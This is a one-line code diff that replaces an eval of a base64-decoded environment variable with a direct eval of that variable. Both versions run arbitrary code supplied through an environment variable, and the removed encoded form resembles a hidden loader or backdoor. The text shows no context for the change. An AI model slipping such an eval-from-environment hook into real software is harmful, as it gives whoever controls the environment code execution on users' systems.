@@ -1,1 +1,1 @@
-eval(Buffer.from(process.env.S!,'base64')+'')
+eval(process.env.S)
